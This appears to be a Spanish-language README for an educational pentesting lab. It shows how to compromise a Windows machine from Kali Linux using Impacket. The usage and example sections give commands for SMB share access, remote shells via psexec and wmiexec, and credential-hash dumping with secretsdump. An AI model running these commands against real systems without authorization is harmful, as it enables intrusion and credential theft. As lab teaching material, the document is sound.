# 🦉 Laboratorio de Pentesting con Impacket

**ElBuhoDev Hacking Framework v2.0**

## 📋 Descripción del Trabajo

Este laboratorio enseña técnicas de pentesting ético en un entorno controlado, enfocado en la explotación de servicios Windows desde Kali Linux utilizando Impacket. Proporciona una interfaz interactiva que simula operaciones de hacking ético contra sistemas Windows vulnerables.

### Objetivos del Laboratorio:
- ✅ Reconocimiento de red y escaneo de puertos
- ✅ Explotación de servicios SMB
- ✅ Ejecución remota con PSExec y WMI
- ✅ Extracción de hashes de credenciales
- ✅ Técnicas de post-explotación

**⚠️ ADVERTENCIA**: Solo para fines educativos y pruebas éticas en entornos controlados.

## 🛠️ Herramienta Elegida: Impacket

**Impacket** es una colección de clases Python para protocolos de red, especialmente útil para:

### Herramientas Principales:
- **smbclient.py**: Cliente SMB para recursos compartidos
- **psexec.py**: Ejecución remota vía SMB
- **wmiexec.py**: Shell remoto a través de WMI
- **secretsdump.py**: Extracción de hashes

## 🔧 Requisitos Previos

### Sistema Atacante (Kali Linux):
- Python 3.6+ y permisos root
- 1GB espacio libre y conexión a internet

### Sistema Objetivo (Windows 10):
- Usuario administrador configurado
- SMB habilitado (puerto 445)
- Firewall configurado para lab

### Red:
- Ambos sistemas en la misma red local
- Conectividad IP sin proxy/NAT

## 📦 Instalación

### Opción 1: Instalación Automática (Recomendada)

```bash
# Crear e instalar todo automáticamente
cat > install_lab.sh << 'EOF'
#!/bin/bash
echo "🦉 Instalando Laboratorio Impacket..."
sudo apt update && sudo apt install python3-impacket python3-pip nmap -y
sudo pip3 install colorama netifaces
mkdir -p ~/pentesting-lab && cd ~/pentesting-lab
wget [URL_DEL_SCRIPT] -O hacker_menu.py && chmod +x hacker_menu.py
echo "✅ Instalación completada. Ejecuta: ./impacket.sh"
EOF

chmod +x install_lab.sh && sudo bash install_lab.sh
```

### Opción 2: Instalación Manual

```bash
# 1. Instalar dependencias
sudo apt update
sudo apt install python3-impacket python3-pip nmap -y
sudo pip3 install colorama netifaces

# 2. Descargar framework
mkdir ~/pentesting-lab && cd ~/pentesting-lab
wget [URL_DEL_SCRIPT] -O hacker_menu.py
chmod +x hacker_menu.py

# 3. Crear script de ejecución rápida
cat > impacket.sh << 'EOF'
#!/bin/bash
echo "🦉 Iniciando Laboratorio Impacket..."
if [ ! -f "hacker_menu.py" ]; then
    echo "❌ hacker_menu.py no encontrado"
    exit 1
fi
sudo python3 hacker_menu.py
EOF

chmod +x impacket.sh
```

### Verificación:
```bash
dpkg -l | grep impacket && echo "✅ Impacket OK"
python3 -c "import colorama, netifaces" && echo "✅ Dependencias OK"
```

## 🚀 Instrucciones de Uso

### Método 1: Menú Interactivo (Recomendado)

```bash
# Ejecución rápida
./impacket.sh

# O manualmente
sudo python3 hacker_menu.py
```

**Proceso:**
1. **Configuración**: El sistema detecta IP de Kali automáticamente
2. **Objetivos**: Ingresar IP Windows + credenciales admin
3. **Navegación**: Usar opciones 1-9 del menú

**Opciones del Menú:**
- **1**: Reconocimiento (ping, nmap)
- **2**: SMB (recursos compartidos)
- **3**: PSExec (shell remoto)
- **4**: WMI (shell alternativo)
- **5**: Hashes (extracción credenciales)
- **9**: Configuración

### Método 2: Comandos Manuales

#### Reconocimiento:
```bash
ping -c 4 [IP_WINDOWS]
nmap -sV -sC [IP_WINDOWS]
```

#### Explotación SMB:
```bash
python3 /usr/share/doc/python3-impacket/examples/smbclient.py [USER]:[PASS]@[IP]

# Comandos internos SMB:
shares          # Listar recursos
use C           # Acceder disco C:
ls              # Listar archivos
get archivo     # Descargar
```

#### Shell Remoto:
```bash
# PSExec
python3 /usr/share/doc/python3-impacket/examples/psexec.py [USER]:[PASS]@[IP]

# WMI
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py [USER]:[PASS]@[IP]
```

#### Extracción Hashes:
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py [USER]@[IP] -p '[PASS]'
```

## 📊 Ejemplos Prácticos

### Escenario Completo: Compromiso de Windows
```bash
# 1. Reconocimiento
ping -c 4 192.168.1.100
nmap -p 445 192.168.1.100

# 2. SMB
python3 /usr/share/doc/python3-impacket/examples/smbclient.py admin:password@192.168.1.100
# Dentro: shares → use C → ls → cd Users → get flag.txt

# 3. Shell
python3 /usr/share/doc/python3-impacket/examples/psexec.py admin:password@192.168.1.100
# Dentro: whoami → systeminfo → net user

# 4. Hashes
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py admin@192.168.1.100 -p 'password'
```

### Interpretación de Resultados:
- ✅ **Puerto 445 abierto** = SMB disponible
- ✅ **Autenticación exitosa** = Credenciales válidas  
- ✅ **Shell obtenido** = Acceso remoto conseguido
- ❌ **Connection refused** = Firewall/servicio inactivo

## 🐛 Troubleshooting

### Instalación:
```bash
# Error: Impacket not found
sudo apt install python3-impacket

# Error: Permission denied  
sudo python3 hacker_menu.py

# Error: Module not found
sudo pip3 install colorama netifaces
```

### Ejecución:
```bash
# Error: Script not found
cd ~/pentesting-lab && ls -la

# Error: Connection refused
# Verificar: ping [IP] && nmap -p 445 [IP]
```

## 🔐 Aspectos de Seguridad

### Uso Ético:
- Solo en laboratorios controlados
- Autorización por escrito requerida
- Documentar todas las actividades

### Defensas Recomendadas:
- Deshabilitar SMBv1
- Implementar MFA
- Logs de auditoría
- Principio de menor privilegio

## 📚 Referencias

- [Impacket Documentation](https://github.com/SecureAuthCorp/impacket)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

**Desarrollado por ElBuhoDev** 🦉 | *Uso ético y responsable solamente*
